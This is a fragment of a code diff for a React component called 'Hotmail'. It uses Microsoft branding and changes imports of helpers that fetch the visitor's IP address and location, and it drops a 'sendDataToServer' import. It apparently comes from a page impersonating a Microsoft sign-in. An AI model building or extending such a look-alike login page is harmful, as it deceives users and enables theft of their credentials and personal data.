@@ -8,10 +8,9 @@ import Microsoft from "../../public/Microsoft_logo_(2012).png";
 import ToolTip from "../../public/question.png";
 import Back from "../../public/back.png";
 import MicrosoftLoading from "./MicrosoftLoading";
-import { getIp, getLocationDetails } from "../utils/getData";
-import { sendDataToServer } from "../utils/postData";
 
-// import { Metadata } from "../hotmail/Hotmail_meta";
+import { getLocationDetails } from "@/utils/thirdPartyUtils/getLocationDetails";
+import { getIp } from "@/utils/thirdpartyUtils/getIp";
 
 export default function Hotmail() {
   const [email, setEmail] = useState(true);
